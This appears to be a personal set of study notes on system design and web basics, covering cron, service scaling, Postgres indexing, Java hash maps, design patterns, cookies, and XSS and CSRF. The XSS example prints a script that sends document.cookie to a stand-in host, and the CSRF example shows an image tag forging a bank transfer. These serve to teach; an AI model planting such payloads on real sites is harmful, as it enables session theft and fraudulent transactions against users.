## Concepts

### 1. CRON expressions
https://www.baeldung.com/cron-expressions
Simply put, cron is a basic utility available on Unix-based systems. It enables users to schedule tasks to run periodically at a specified date/time.
```
 *       *    *    *          *           *
 Minute Hour Day Month Day-of-the-week command
```

example
```
* * * * * /usr/local/ispconfig/server/server.sh
```
This entry runs the mentioned script every single minute.


### 2. Scaling the service in system design

1. Break your service into two or three to scale them separately.
   - for example , in case of job scheduler, if we have a Jobs service, we can instead have two service
       - Jobs service : which takes care of the writes i.e job creations/cancellation etc
       - Query Service : which queries the db to get the status of the jobs for users to see
  
   - The advantage here, is that now we can scale both the services independently, eg. if there are too many writes, we can have a more scaled version for Job service

2. Using Queues to decouple the services
3. Use CDN for API cache / Media cache : but dont use CDN if your users are not geographically distributed, there is no point. Also dont use CDN if you dont want requests to keep going to CDN always i.e your data can change or you want requests to come to your servers also to know things are working.
4. Use Redis cache to make queries faster
5. Use Zookeeper is any server coordination is required.

### Indexing in Postgres
- Default for primary key index is B Tree , so lookup time is O log N
- We can create anotehr index which uses hash for lookup that reduces lookup time to O(1)
- We can use CDN but it has the same problem as 302. requests would always get served from CDN
- So we can use Redis cache  LRU with read through strategy

#### Concurrent HashMap vs Synchronized HashMap
- synchronizedMap allows only one thread at a time for any operation (read or write), blocking all others.
- ConcurrentHashMap allows concurrent reads and writes: it only locks the specific bucket/segment being updated, so operations on different buckets can proceed in parallel, giving much higher scalability.

### LLD Best practices : 
- To make this class immutable and thread-safe, I’ll make fields final and avoid setters.
- To keep it extensible, I’ll define an interface and multiple implementations.
- If we need real-time event propagation, we can add an Observer or publish-subscribe mechanism
- To support future types without modifying core logic, I’ll use a Factory
- To ensure single instance and consistency, I’ll use a Singleton. eg DBConnectionManager, ConfigurationManager, Logger, CacheManager etc

Q. In redis whats the eviction strategy ?  do we dine one? where ?
Q. What are the different types of cache usage eg Read through , write through etc
Q. When to use memcachd vs redis vs HA etc
Q. When to use CDN vs when to not ? 
Q. Learn moer about HA mode in redis , how it works, what if it still fails for a usecase like url shortener



### Cookies
A cookie is sent by the server with rules that tell the browser **when and where to send it back**. The **domain** restricts which website can receive the cookie, and the **path** restricts which URL prefixes on that site it applies to—so a single cookie can automatically be sent to **many endpoints**, not just one. The server fully controls the cookie’s **lifetime** (via expiry), **scope** (domain and path), and **security** using flags like `HttpOnly` (not accessible to JavaScript), `Secure` (HTTPS only), and `SameSite` (controls cross-site requests), while the browser simply stores the cookie and follows these rules.


### XSS Attack (Cross-Site Scripting)
XSS happens when an attacker injects malicious JavaScript into a website, and that script runs inside the victim’s browser as if it were trusted site code.
example
- Step 1: Backend stores this comment as plain text: "Nice article!"
- Frontend renders:
- <p>User comment: Nice article!</p> ✅ Safe.

- Step 2: What the attacker submits instead
- The attacker submits code, not text:
```
<script>
  fetch("https://evil.com/steal?c=" + document.cookie)
</script>
```

- The backend stores this as-is (this is the bug).

- Step 3: What the victim’s browser receives
- Later, a normal user opens the page.
- The server sends HTML like this:
```
<p>User comment:
  <script>
    fetch("https://evil.com/steal?c=" + document.cookie)
  </script>
</p>
```

- ⚠️ This is now part of the page’s HTML.


### CSRF Attack (Cross-Site Request Forgery)
CSRF tricks a logged-in user’s browser into making a request they didn’t intend, using cookies that the browser automatically sends.
example
- User is logged into: bank.com
- Bank uses cookies for auth.
- User visits : evil.com
- That page has: ** <img src="https://bank.com/transfer?amount=10000&to=attacker" /> **
- Browser : Automatically sends bank cookies
- Bank sees a valid authenticated request
- Money is transferred 😬

